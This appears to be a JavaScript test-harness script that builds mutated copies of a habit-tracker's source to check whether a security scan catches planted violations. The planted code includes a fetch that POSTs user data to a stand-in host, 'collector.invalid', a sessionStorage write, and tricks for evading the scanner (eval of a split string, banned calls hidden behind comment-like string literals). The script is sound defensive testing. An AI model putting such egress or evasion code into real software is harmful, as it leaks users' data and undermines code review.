// Security finder re-check 2: builds throwaway mirrors of HEAD's src/, tests/ and the sample fixture under
// ./mirrors/<name>/, each with one deliberate change to src/habits.js, to test the R16 scan at HEAD.
// The first four mutants are the first audit's, then the re-check's two hunts, then this round's hunts:
// code built from a string, and banned calls placed after a "//" or "/*" inside a string literal on the
// same line, which the test's comment stripper may remove. The real src/, tests/ and docs/design/ are
// only read.
import { cpSync, readFileSync, writeFileSync, mkdirSync } from "node:fs";

const root = new URL("../../../../../../", import.meta.url);
const mirrors = new URL("./mirrors/", import.meta.url);

const IMPORT = 'import { addDays, dayParts, isDateKey, weekdayIndex } from "./dates.js";';
const IMPORT_WITH_CLOCK = 'import { addDays, dayParts, isDateKey, weekdayIndex, localDateKey } from "./dates.js";';
const SIGNATURE = "export function currentStreak(done, todayKey) {";
const LIMIT_LINE = '  if (habits.length >= MAX_HABITS) return { ok: false, error: "limit" };';
const CONSTANT_LINE = "const NEXT_DAY = 1;";

const clockMutant = (expression) => [
  [IMPORT, IMPORT_WITH_CLOCK],
  [SIGNATURE, `export function currentStreak(done, todayKey = localDateKey(${expression})) {`],
];
const defaultToday = (expression) => [[SIGNATURE, `export function currentStreak(done, todayKey = ${expression}) {`]];
const extraLine = (line) => [[CONSTANT_LINE, `${CONSTANT_LINE}\n${line}`]];

const variants = {
  "baseline-unchanged": [],
  "control-clock-new-Date-with-parens": clockMutant("new Date()"),
  "clock-new-Date-without-parens": clockMutant("new Date"),
  "clock-Date-called-as-function": clockMutant("new Date(Date())"),
  "egress-fetch-and-sessionStorage": [
    [CONSTANT_LINE, `${CONSTANT_LINE}\nconst reportUsage = (body) => fetch("https://collector.invalid/streaks", { method: "POST", body });`],
    [LIMIT_LINE, `  if (habits.length > 1000) {\n    sessionStorage.setItem("streaks.last", raw);\n    reportUsage(raw);\n  }\n${LIMIT_LINE}`],
  ],
  "hunt-Temporal-Now": defaultToday("Temporal.Now.plainDateISO().toString()"),
  "hunt-Reflect-construct-Date": clockMutant("Reflect.construct(Date, [])"),
  "hunt-eval-string": clockMutant('eval("new " + "Da" + "te")'),
  "hunt-banned-after-url-string": extraLine('const COLLECTOR = { url: "https://collector.invalid/streaks", send: (body) => fetch(COLLECTOR.url, { method: "POST", body }) };'),
  "hunt-banned-after-mime-string": [
    ...extraLine('const ACCEPT = "*/*"; const lastName = () => sessionStorage.getItem("streaks.last");'),
  ],
};

const summary = [];
for (const [name, edits] of Object.entries(variants)) {
  const target = new URL(`${name}/`, mirrors);
  mkdirSync(new URL("docs/design/", target), { recursive: true });
  cpSync(new URL("src/", root), new URL("src/", target), { recursive: true });
  cpSync(new URL("tests/", root), new URL("tests/", target), { recursive: true });
  cpSync(new URL("docs/design/sample-history.json", root), new URL("docs/design/sample-history.json", target));
  const file = new URL("src/habits.js", target);
  let text = readFileSync(file, "utf8");
  for (const [from, to] of edits) {
    const count = text.split(from).length - 1;
    if (count !== 1) throw new Error(`${name}: expected exactly one "${from}", found ${count}`);
    text = text.replace(from, to);
  }
  writeFileSync(file, text);
  const original = readFileSync(new URL("src/habits.js", root), "utf8");
  summary.push(`${name}: ${edits.length} edit(s), mirror src/habits.js ${text === original ? "identical to" : "differs from"} HEAD`);
  for (const [, to] of edits) summary.push(`  + ${to.split("\n").join("\n    ")}`);
}
writeFileSync(new URL("./make-mirrors.txt", import.meta.url), summary.join("\n") + "\n");
console.log(summary.join("\n"));
